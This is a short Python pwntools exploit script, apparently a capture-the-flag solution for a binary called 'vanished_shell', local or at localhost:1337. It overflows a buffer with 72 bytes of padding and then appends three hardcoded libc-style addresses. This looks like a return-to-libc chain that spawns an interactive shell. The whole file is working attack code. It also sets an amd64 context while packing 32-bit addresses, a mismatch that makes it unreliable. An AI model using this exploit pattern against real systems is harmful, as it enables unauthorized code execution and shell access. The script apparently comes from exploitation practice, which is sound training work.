#!/usr/bin/python3

from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./vanished_shell')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('localhost', 1337)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

chall = ELF('./vanished_shell', checksec=True)

pd = b'A' * 72
pd += p32(0xf7dd38f0)
pd += p32(0xf7dc25c0)
pd += p32(0xf7f40de8)
p.sendline(pd)
p.interactive()
